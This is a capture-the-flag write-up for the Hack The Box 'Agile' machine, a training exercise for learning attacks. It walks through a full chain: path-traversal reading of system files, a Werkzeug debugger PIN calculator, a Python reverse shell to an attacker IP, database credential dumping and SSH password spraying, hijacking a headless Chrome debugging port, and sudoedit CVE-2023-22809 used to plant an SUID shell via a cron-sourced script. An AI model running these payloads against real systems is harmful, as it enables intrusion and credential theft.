# Agile — Hack The Box Writeup

| Property       | Value                                                                                                                                                 |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Machine**    | Agile                                                                                                                                                 |
| **OS**         | Linux (Ubuntu 22.04 LTS Jammy)                                                                                                                        |
| **IP**         | 10.129.228.212                                                                                                                                        |
| **Domain**     | superpass.htb, test.superpass.htb                                                                                                                     |
| **Difficulty** | Medium                                                                                                                                                |
| **Author**     | PeterTheFlower/Pitiliti1                                                                                                                              |
| **Tags**       | Flask, Werkzeug Debugger, PIN Exploit, Local File Inclusion (LFI), Credential Dumping, Chrome Remote Debugging, Sudoedit, CVE-2023-22809, Cron Abuse |

---

## Summary

Agile is a Medium-difficulty Linux machine running Ubuntu 22.04 that emphasizes methodical enumeration, connecting disparate findings, and abusing developer automation. Initial reconnaissance reveals an Nginx reverse proxy serving a Python Flask password manager application ("Superpass") on port 80. Testing default credentials on the login portal triggers an unhandled database exception that exposes the Werkzeug Interactive Debugger. While the debugger console is protected by a PIN, registering an unprivileged user account unlocks the vault export feature, which is vulnerable to Local File Inclusion (LFI) via an unvalidated `fn` download parameter. By recognizing that Werkzeug's console PIN is deterministically computed from server-side hardware and process artifacts, the LFI is systematically leveraged to harvest the required seeds (`/proc/self/status`, network interface MAC address, machine-id, and systemd cgroup slice), enabling offline PIN calculation and unlocking an interactive Python reverse shell as `www-data`.

Lateral movement progresses through two distinct investigative stages. First, inspecting `/app/config_prod.json` yields local MySQL credentials. Querying the `superpass` database reveals 20-character hexadecimal strings that represent stored vault passwords rather than standard cryptographic hashes; spraying these against SSH yields access as user `corum`. Inspecting background processes on the host uncovers a recurring cron job running Selenium functional tests with headless Google Chrome attached to an open remote debugging port (`41829`) and pausing for 550 seconds. Forwarding the debugging port via SSH allows connecting Chromium DevTools (`chrome://inspect`) to the live browser session, extracting cleartext vault passwords for user `edwards`. Finally, privilege escalation analyzes `edwards`'s restricted `sudoedit` permissions. Because the host runs Sudo 1.9.9, argument injection via user-controlled `EDITOR` variables (**CVE-2023-22809**) allows editing arbitrary files writable by group `dev_admin`. Injecting an SUID bash creation payload into the virtual environment's `/app/venv/bin/activate` script—which is sourced by a recurring system cron task—yields an SUID root binary and completes full system compromise.

---

## 1. Reconnaissance

### 1.1 Port Scan

An initial full TCP port scan was executed using Nmap:

```bash
nmap -Pn -sC -sV -p- -T4 -v 10.129.228.212 -oN nmap.txt 10.129.228.212
```

```
Nmap scan report for 10.129.228.212
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port   | State | Service | Version / Notes                                              |
| :----- | :---- | :------ | :----------------------------------------------------------- |
| 22/tcp | open  | SSH     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; Protocol 2.0) |
| 80/tcp | open  | HTTP    | Nginx 1.18.0 (Redirects to `http://superpass.htb`)           |

> **Theory — Web Application Focus & Virtual Hosting:**  
> The perimeter scan shows only standard SSH and HTTP ports open. OpenSSH 8.9p1 is modern and does not present viable pre-authentication remote exploits. The HTTP 301 redirection header pointing to `http://superpass.htb` confirms the target relies on virtual host routing. Consequently, all initial attack vectors must focus on the web application layer.

---

### 1.2 Web Application Enumeration

#### Fingerprinting the Backend Framework

Querying the target IP directly returns an HTTP 301 redirection header to `http://superpass.htb`:

```bash
curl -I 10.129.228.212
```

```http
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 24 Nov 2026 09:00:18 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://superpass.htb
```

The domain was appended to the local hosts file:

```bash
echo "10.129.228.212 superpass.htb" | sudo tee -a /etc/hosts
```

To determine what framework powers the application, a request was made to an intentionally non-existent endpoint to observe default error page templates:

```bash
curl -s http://superpass.htb/sth_that_doesnt_exist
```

```html
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

The distinctive styling, markup structure, and text of the 404 response are the signature default error page rendered by **Werkzeug / Flask (Python)**.

---

#### Inspecting the Login Portal & Triggering Werkzeug Debug Mode

Navigating to `http://superpass.htb` reveals "Superpass", a web-based password manager service.

A logical first check against any authentication interface is testing standard default credentials (e.g., `admin:admin`) to test authentication handling and check whether an administrative user exists:

![Unhandled Login Exception](images_writeup/login_error_traceback.png)

Submitting `admin:admin` immediately triggered an unhandled server exception (`OperationalError` / database failure). Because the application was deployed with developer debugging enabled, Werkzeug intercepted the error and rendered the full interactive traceback screen:

![Werkzeug Interactive Traceback](images_writeup/werkzeug_traceback.png)

Hovering over any frame in the execution call stack reveals an interactive Python console icon. Clicking it displays a prompt for the **Werkzeug Console PIN**:

![[images_writeup/error_debug_mode.png]]

> **Thought Process & Tactical Decision:**  
> The presence of the Werkzeug interactive console is a critical signal. If unlocked, it allows executing arbitrary Python code directly on the server (instant Remote Code Execution).  
> However, the console is locked behind a PIN. From security research (e.g., HackTricks / Werkzeug PIN calculation), we know that the PIN is generated deterministically from specific host and environment variables (username, module path, network MAC address, machine-id, cgroup).  
> At this moment, we have no read access to the underlying operating system. **We make a mental note:** *Right now we cannot compute the PIN, but if we can discover a Local File Inclusion (LFI) or arbitrary file read vulnerability elsewhere on the site, we can circle back, extract the necessary host artifacts, regenerate the PIN offline, and achieve RCE.*

---

## 2. Initial Access — LFI to Werkzeug PIN Calculation & Python RCE

### 2.1 Exploring Application Functionality & Discovering LFI

After refreshing the page, the error disappeared and the portal returned a generic message: `Invalid username or password`. This created ambiguity: did the username `admin` not exist at all, or was only the password incorrect?

To clarify this, we turned to the registration portal at `http://superpass.htb/account/register`. Attempting to register the username `admin` with password `admin` succeeded without error:
- This confirmed that `admin` did not previously exist in the database.
- It provided us with valid authenticated access to the application dashboard.

Inside the authenticated dashboard, users can add credentials to their personal password vault and export them:

![Superpass Vault Export Feature](images_writeup/vault_export_interface.png)

I added a dummy entry to the vault and clicked the **Export** button to observe how the export mechanism generates and serves files:

![Burp Suite Vault Export Redirection](images_writeup/burp_export_redirect.png)

Capturing the HTTP traffic in Burp Suite reveals that clicking **Export** triggers an HTTP POST request, which responds with an HTTP 302 redirection to `/download` with a query parameter `fn`:

```http
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Location: /download?fn=superpass_export_admin.csv
```

Seeing a direct file name passed inside a URL parameter (`fn=superpass_export_admin.csv`) immediately suggested an opportunity to test for Directory Traversal / Local File Inclusion (LFI):

![Local File Inclusion Path Traversal](images_writeup/lfi_download_test.png)

From the application's behavior, the export routine stores temporary CSV files in `/tmp`. If the application fails to validate the `fn` parameter, we can traverse directory levels using `../`.

Testing path traversal to read `/etc/passwd`:

```bash
curl -s "http://superpass.htb/download?fn=../etc/passwd" -b "session=<SESSION_COOKIE>"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
```

The traversal worked cleanly, confirming an unauthenticated/authenticated **arbitrary file read** vulnerability. Filtering for users with active shells (`/bin/bash` or `/bin/sh`) revealed key local accounts:
- `corum` (UID 1000)
- `runner` (UID 1001)
- `edwards` (UID 1002)
- `dev_admin` (UID 1003)

---

### 2.2 Connecting the Dots: Gathering Ingredients for the Werkzeug PIN

With a confirmed Local File Inclusion vulnerability, we returned to our earlier hypothesis: **we can now extract all parameters required by Werkzeug's PIN generation algorithm to unlock the interactive debug console.**

In Werkzeug 2.0+, the PIN is calculated by hashing two sets of data using SHA-1:

#### 1. Public Bits
- **`username`**: The system user running the Python process.
  - Querying `/proc/self/status` via LFI reveals `Uid: 33`.
  - Checking `/etc/passwd` confirms UID 33 corresponds to `www-data`.
- **`modname`**: The module importing the Flask app, standardly `flask.app`.
- **`app_name`**: The name of the application class, standardly `wsgi_app` (confirmed by the error traceback).
- **`mod_path`**: The absolute path to `flask/app.py` in the active virtual environment.
  - The stack trace on the error page showed: `/app/venv/lib/python3.10/site-packages/flask/app.py`.

#### 2. Private Bits
- **`MAC Address` (`uuid.getnode()`)**:
  - Reading `/proc/net/dev` via LFI confirms `eth0` is the primary interface.
  - Reading `/sys/class/net/eth0/address` returns: `a2:de:ad:d3:a2:34`.
  - Converting the hexadecimal MAC string `a2deadd3a234` to a decimal integer:
    ```python
    print(0xa2deadd3a234) # Result: 179077282767412
    ```
- **`Machine ID`**:
  - In modern Linux installations running systemd, Werkzeug reads `/etc/machine-id` (or `/proc/sys/kernel/random/boot_id`) and appends the first line of `/proc/self/cgroup` containing the systemd service name.
  - Reading `/etc/machine-id`: `ed5b159560f54721827644bc9b220d00`.
  - Reading `/proc/self/cgroup`: `0::/system.slice/superpass.service`.
  - Combining the machine ID with the cgroup service name:
    `ed5b159560f54721827644bc9b220d00superpass.service`.

---

### 2.3 Computing the PIN & Spawning the Reverse Shell

The extracted values were assembled into a custom generator script (`generate_pin.py`):

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'www-data',                                            # username
    'flask.app',                                           # modname
    'wsgi_app',                                            # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None)
]

private_bits = [
    '179077282767412',                                     # str(uuid.getnode()) from /sys/class/net/eth0/address
    'ed5b159560f54721827644bc9b220d00superpass.service'   # /etc/machine-id + cgroup slice
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(f"Calculated Werkzeug PIN: {rv}")
```

Running the script generated:

```text
Calculated Werkzeug PIN: 724-465-551
```

Returning to the Werkzeug debug console and submitting `724-465-551` unlocked the interactive Python shell. A reverse shell payload was executed:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.197",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")
```

The netcat listener received the connection, and the shell was upgraded to an interactive TTY:

```bash
nc -nlvp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.197] from (UNKNOWN) [10.129.228.212] 54932
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
(venv) www-data@agile:/app/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We now had initial access as `www-data`.

---

## 3. Lateral Movement & Privilege Escalation

### 3.1 Lateral Movement to `corum` via Database Password Vault

#### Local File Enumeration & Database Dumping
With access to the filesystem, we inspected the application configuration files in `/app`:

```bash
ls -la /app
```

```bash
cat /app/config_prod.json
```

```json
{
  "SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"
}
```

The configuration contained local MySQL credentials: `superpassuser:dSA6l7q*yIVs$39Ml6ywvgK`. Connecting to the MySQL instance:

```bash
mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' -e "SELECT * FROM superpass.passwords;"
```

```text
+----+-------------------+----------------------+
| id | username          | password             |
+----+-------------------+----------------------+
|  1 | 0xdf              | 762b430d32eea2f12970 |
|  2 | 0xdf              | 5b133f7a6a1c180646cb |
|  3 | corum             | 47ed1e73c955de230a1d |
|  4 | corum             | 9799588839ed0f98c211 |
|  5 | corum             | 5db7caa1d13cc37c9fc2 |
+----+-------------------+----------------------+
```

#### Analytical Breakdown: Hashes or Passwords?
At first glance, strings like `5db7caa1d13cc37c9fc2` look like hex hashes. However, analyzing their characteristics:
- Each string is exactly **20 hexadecimal characters** (10 bytes / 80 bits).
- Common hashes have standard lengths: MD5 is 32 hex chars, SHA-1 is 40 hex chars, NTLM is 32 hex chars. None of them produce 20-character outputs.
- Because Superpass is a password generator and vault application, these entries are **randomly generated plaintext passwords stored in the users' vaults**.

We extracted all usernames and passwords into `users.txt` and `passwords.txt` and used NetExec (`nxc`) to test them against the SSH service:

```bash
nxc ssh 10.129.228.212 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

```text
SSH         10.129.228.212  22     10.129.228.212   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.129.228.212  22     10.129.228.212   [-] 0xdf:762b430d32eea2f12970
SSH         10.129.228.212  22     10.129.228.212   [-] 0xdf:5b133f7a6a1c180646cb
SSH         10.129.228.212  22     10.129.228.212   [-] corum:47ed1e73c955de230a1d
SSH         10.129.228.212  22     10.129.228.212   [-] corum:9799588839ed0f98c211
SSH         10.129.228.212  22     10.129.228.212   [+] corum:5db7caa1d13cc37c9fc2  Linux - Shell access!
```

User `corum` reused a password stored in their vault (`5db7caa1d13cc37c9fc2`) as their system SSH password!

#### User Flag Acquisition
Logging in via SSH as `corum`:

```bash
ssh corum@10.129.228.212
```

```bash
corum@agile:~$ id
uid=1000(corum) gid=1000(corum) groups=1000(corum)
corum@agile:~$ cat user.txt
8a5355cbc20de40c08f28bab6b05baad
```

**🚩 User flag obtained: `8a5355cbc20de40c08f28bab6b05baad`**

---

### 3.2 Lateral Movement to `edwards` via Chrome Remote Debugging Protocol Abuse

#### Investigating Background Automation
We checked for custom sudo permissions with `sudo -l`, but `corum`'s password was rejected for sudo.

Next, we audited running system processes using `ps -ef --forest` to check for active background jobs or unusual daemons:

```bash
ps -ef --forest
```

```text
\_ /usr/sbin/CRON -f -P
runner      4884    4877  0 11:00 ?        00:00:00      \_ /bin/sh -c /app/test_and_update.sh
runner      4885    4884  0 11:00 ?        00:00:00          \_ /bin/bash /app/test_and_update.sh
runner      4892    4885  0 11:00 ?        00:00:00              \_ /app/venv/bin/python3 /app/venv/bin/pytest -x
runner      4893    4892  0 11:00 ?        00:00:00                  \_ chromedriver --port=45457
runner      4899    4893  0 11:00 ?        00:00:00                      \_ /usr/bin/google-chrome --allow-pre-commit-input ...
```

A cron task was actively running `/app/test_and_update.sh` under user `runner`. Examining `/app/test_and_update.sh`:

```bash
cat /app/test_and_update.sh
```

```bash
#!/bin/bash
# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

The script runs automated testing using `pytest` inside `/app/app-testing`. We inspected the test scripts in `/app/app-testing/tests/functional/`:

```bash
cat /app/app-testing/tests/functional/test_site_interactively.py
```

```python
with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
    username, password = f.read().strip().split(':')

@pytest.fixture(scope="session")
def driver():
    options = Options()
    options.add_argument("--window-size=1420,1080")
    options.add_argument("--headless")
    options.add_argument("--remote-debugging-port=41829")
    options.add_argument('--disable-gpu')
    options.add_argument('--crash-dumps-dir=/tmp')
    driver = webdriver.Chrome(options=options)
    yield driver
    driver.close()

def test_login(driver):
    driver.get('http://test.superpass.htb/account/login')
    ...

def test_long_running(driver):
    driver.get('http://test.superpass.htb')
    time.sleep(550)
    assert "SuperPasword 🦸" == driver.title
```

#### Recognizing the Flaw: The 550-Second Remote Debugging Window
Analyzing the test script revealed two crucial details:
1. Google Chrome was explicitly started with `--remote-debugging-port=41829` bound to `127.0.0.1`.
2. The function `test_long_running()` calls `time.sleep(550)` — keeping the browser instance alive and waiting for **over 9 minutes**!

> **Theory — Exploiting Chrome DevTools Protocol (CDP):**  
> Google Chrome's remote debugging interface allows full control over the browser session via HTTP and WebSockets. By connecting DevTools to port 41829, an attacker can view whatever webpage Chrome is currently displaying, capture screenshots, view cookies, and inspect the rendered DOM tree in real time.

#### Intercepting the Headless Chrome Session
To access the loopback port from our attacking machine, an SSH local port forward was established:

```bash
ssh -L 41829:127.0.0.1:41829 corum@10.129.228.212
```

On the attacking workstation, opening Chromium and navigating to `chrome://inspect` displayed the remote debugging targets. The target localost:41829 had to be added. Clicking **Inspect** launched DevTools connected to the target browser session.

![Chromium DevTools Remote Inspection](images_writeup/chrome_devtools_inspect.png)

 Chrome had logged into `test.superpass.htb` as user `edwards`, and the rendered DOM contained Edwards' stored vault secrets:

![Edwards Password Vault in Headless Chrome](images_writeup/edwards_vault_passwords.png)

The vault revealed:
- **Username**: `edwards`
- **Password**: `d07867c6267dcb5df0af`

We tested this password against SSH as `edwards`:

```bash
ssh edwards@10.129.228.212
```

```bash
edwards@agile:~$ id
uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)
```

The credentials were valid, transitioning our session to user `edwards`.

---

### 3.3 Root Privilege Escalation — Sudoedit Argument Injection (CVE-2023-22809) & Cron Hijacking

#### Investigating Sudo Privileges & Dead Ends
Checking sudo privileges for user `edwards`:

```bash
sudo -l
```

```text
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

`edwards` is permitted to execute `sudoedit` as user `dev_admin` on only two specific configuration files.

First, we checked what information those files contained:
- `creds.txt`: contains `edwards:1d7ffjwrx#$d6qn!9nndqgde4`.
- `config_test.json`: contains test database credentials:
  ```json
  {
    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
  }
  ```

We connected to MySQL using `superpasstester` to see if additional user passwords were stored in `superpasstest`:

```bash
mysql -u superpasstester -p'VUO8A2c2#3FnLq3*a9DX1U' superpasstest -e "SELECT * FROM passwords;"
```

```text
+----+------------+----------------------+
| id | username   | password             |
+----+------------+----------------------+
|  1 | edwards    | d07867c6267dcb5df0af |
|  2 | dedwards__ | 7dbfe676b6b564ce5718 |
+----+------------+----------------------+
```

The database only contained test accounts (`dedwards__`), which led to a **dead end**.

---

#### Identifying Sudoedit Vulnerability: CVE-2023-22809
Because the contents of the files did not provide a path forward, we turned to evaluating the binary itself. Checking the installed Sudo version:

```bash
sudoedit -V
```

```text
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
```

> **Vulnerability Theory — Sudoedit CVE-2023-22809:**  
> Sudo versions 1.8.0 through 1.9.12p1 suffer from an argument injection flaw. When `sudoedit` invokes the editor specified in environment variables like `EDITOR`, `VISUAL`, or `SUDO_EDITOR`, it evaluates `--` as a parameter separator.  
> If an attacker includes `--` in `EDITOR` followed by an arbitrary file path (e.g., `EDITOR="vim -- /path/to/target"`), `sudoedit` fails to restrict editing to the files listed in `/etc/sudoers`. Instead, it allows the user to open and write to **any arbitrary file that the target user (`dev_admin`) has write permissions to**.

---

#### Finding Writable Files for `dev_admin`
We enumerated the filesystem to see which files `dev_admin` owns or has write permissions on:

```bash
find / -group dev_admin 2>/dev/null
```

```text
/home/dev_admin
/app/venv
/app/venv/bin
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
```

Checking the permissions of `/app/venv/bin/activate`:

```bash
ls -la /app/venv/bin/activate
```

```text
-rw-rw-r-- 1 root dev_admin 1976 Aug  5  2023 /app/venv/bin/activate
```

The file is owned by `root:dev_admin` and is **group-writable** (`-rw-rw-r--`)!

#### Weaponizing the Cron Execution Chain
We recalled from earlier process auditing that the automated test script `/app/test_and_update.sh` contains:

```bash
# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate
```

This script is executed regularly by an automated system cron task. Because `source` executes shell commands within the context of the running process, any commands appended to `/app/venv/bin/activate` will execute with the privileges of whichever process runs `test_and_update.sh`.

We invoked `sudoedit` as `dev_admin`, abusing CVE-2023-22809 to inject `/app/venv/bin/activate`:

```bash
EDITOR="vim -- /app/venv/bin/activate" sudoedit -u dev_admin /app/config_test.json
```

In the vim session that opened for `/app/venv/bin/activate`, we navigated to the bottom of the script and appended commands to create an SUID copy of `/bin/bash` in Edwards' home directory:

```bash
cp /bin/bash /home/edwards/shell
chmod 4777 /home/edwards/shell
```

We saved and closed the editor.

#### Root Access
Within one minute, the system cron task executed `/app/test_and_update.sh` and sourced the modified `/app/venv/bin/activate` script:

```bash
edwards@agile:~$ ls -la /home/edwards/shell
-rwsrwxrwx 1 root root 1396520 Nov 24 12:16 /home/edwards/shell
```

The binary was generated owned by `root:root` with SUID permissions (`-rwsrwxrwx`). Executing the SUID binary with the `-p` parameter:

```bash
edwards@agile:~$ ./shell -p
edwards@agile:~# id
uid=1002(edwards) gid=1002(edwards) euid=0(root) groups=1002(edwards)
edwards@agile:~# cat /root/root.txt
7f64765360e073cd5e8d69b55fa3c08c
```

**🚩 Root flag obtained: `7f64765360e073cd5e8d69b55fa3c08c`**

---

## 4. Attack Path Summary

```mermaid
flowchart TD
    A["Nmap Scan (TCP 22, 80)"] --> B["HTTP Enumeration (superpass.htb)<br/>(Flask / Werkzeug Fingerprinting)"]
    B --> C["Probe Login with admin:admin<br/>(Triggers Unhandled Exception -> Werkzeug Traceback & PIN Prompt)"]
    
    C --> D["Recognize PIN Attack Potential<br/>(Note requirement for host seeds via future LFI)"]
    B --> E["Register Account & Test Vault Features<br/>(Discovers /download?fn=)"]
    
    E --> F["Path Traversal / LFI (/download?fn=../etc/passwd)<br/>(Exfiltrates /etc/passwd: corum, runner, edwards, dev_admin)"]
    
    D --> G["Connect LFI to Werkzeug PIN Regeneration"]
    F --> G
    
    G --> H["Exfiltrate Werkzeug Seeds via LFI<br/>- UID 33 (www-data)<br/>- flask/app.py path<br/>- eth0 MAC (179077282767412)<br/>- /etc/machine-id + cgroup slice"]
    
    H --> I["Offline PIN Computation (generate_pin.py)<br/>(Calculated PIN: 724-465-551)"]
    I --> J["Unlock Werkzeug Console<br/>(Execute Python Reverse Shell -> www-data)"]
    
    J --> K["Inspect /app/config_prod.json<br/>(MySQL: superpassuser / dSA6l7q*yIVs$39Ml6ywvgK)"]
    K --> L["Dump superpass.passwords Database<br/>(Deduce 20-char hex values are plaintext vault passwords)"]
    
    L --> M["Password Spray via NetExec<br/>(Matches corum:5db7caa1d13cc37c9fc2)"]
    M --> N["SSH Authentication as corum<br/>(User Flag)"]
    
    N --> O["Process Auditing (ps -ef --forest)<br/>(Identifies runner cron executing Selenium headless Chrome)"]
    O --> P["Inspect Functional Test Script<br/>(Finds --remote-debugging-port=41829 & 550s sleep window)"]
    
    P --> Q["SSH Local Port Forward (41829 -> 127.0.0.1:41829)"]
    Q --> R["Attach Chromium DevTools (chrome://inspect)<br/>(Inspect live DOM of edwards vault session)"]
    
    R --> S["Extract edwards Password (d07867c6267dcb5df0af)<br/>(SSH Authentication as edwards)"]
    
    S --> T["Sudo Enumeration (sudo -l)<br/>(sudoedit /app/config_test.json as dev_admin)"]
    T --> U["Identify Sudo 1.9.9 (CVE-2023-22809)<br/>(EDITOR argument injection via --)"]
    
    U --> V["Find dev_admin Writable Files<br/>(/app/venv/bin/activate writable by dev_admin)"]
    V --> W["Inject SUID Shell Creation into activate<br/>(EDITOR='vim -- /app/venv/bin/activate' sudoedit ...)"]
    
    W --> X["System Cron Executes /app/test_and_update.sh<br/>(Sources /app/venv/bin/activate with root privileges)"]
    X --> Y["Generates SUID Root Binary (/home/edwards/shell)"]
    Y --> Z["Execute ./shell -p<br/>(Root Flag)"]

    style A fill:#1f2937,stroke:#374151,color:#fff
    style N fill:#047857,stroke:#10b981,color:#fff
    style Z fill:#b91c1c,stroke:#ef4444,color:#fff
```

---

## 5. Tools Used

| Tool | Purpose |
| :--- | :--- |
| **Nmap** | Comprehensive TCP port scanning, service identification, and version detection |
| **cURL** | Banner grabbing, HTTP response header verification, and LFI parameter probing |
| **Burp Suite** | Intercepting HTTP requests, analyzing redirects, and testing path traversal payloads |
| **Python 3** | Calculating the Werkzeug debugger console PIN offline and running custom reverse shell payloads |
| **Netcat** | Listening for inbound interactive reverse shell connections |
| **NetExec (`nxc`)** | Automated SSH credential testing and credential spraying against local accounts |
| **OpenSSH** | Establishing encrypted remote access sessions as users `corum` and `edwards`, and configuring port forwarding |
| **Chromium DevTools** | Attaching to the remote Chrome debugging endpoint via Chrome DevTools Protocol (CDP) |
| **Sudoedit / Vim** | Exploiting CVE-2023-22809 to inject arbitrary file paths and write into the virtual environment |

---

## 6. Lessons Learned

1. **Never enable interactive debuggers in production** — Debuggers like Werkzeug are designed exclusively for local development. Leaving them exposed in a production environment turns any unhandled exception into a critical vulnerability. Even with PIN protection, the deterministic nature of the PIN algorithm means that any local file disclosure can escalate directly to Remote Code Execution.
2. **Canonicalize and whitelist file download paths** — File export and download features must never accept direct file path parameters from users. Files should either be served from dedicated, isolated directories using non-predictable UUID keys or strictly validated against an allowlist of valid file paths using canonicalized paths (`os.path.realpath`).
3. **Restricted interfaces on headless browsers** — Headless browsers running automated functional tests should never have debugging ports enabled unless strictly necessary. When remote debugging is required, it must be restricted to authenticated UNIX sockets, enforce ephemeral ports, and have strict firewall boundaries preventing other local users from tapping into active browser sessions.
4. **Patch security boundaries and restrict sudoedit environments** — Sudo CVE-2023-22809 highlights the danger of user-controlled environment variables bypassing command line restrictions. Organizations should ensure Sudo is upgraded beyond 1.9.12p1 and configure `env_delete` or `secure_path` in `/etc/sudoers` to prevent malicious `EDITOR` or `VISUAL` manipulation. Furthermore, scripts executed by privileged cron tasks must never source files writable by lower-privileged groups.

---

## 7. References

- [Werkzeug Documentation — Debugger Architecture](https://werkzeug.palletsprojects.com/en/latest/debug/)
- [HackTricks — Werkzeug Debugger PIN Exploitation](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)
- [NVD — CVE-2023-22809 (Sudo Sudoedit Privilege Escalation)](https://nvd.nist.gov/vuln/detail/CVE-2023-22809)
- [Synacktiv Advisory — CVE-2023-22809 Sudoedit Bypass](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)
- [Chrome DevTools Protocol (CDP) Specification](https://chromedevtools.github.io/devtools-protocol/)
- [MITRE ATT&CK — T1190 (Exploit Public-Facing Application)](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK — T1068 (Exploitation for Privilege Escalation)](https://attack.mitre.org/techniques/T1068/)
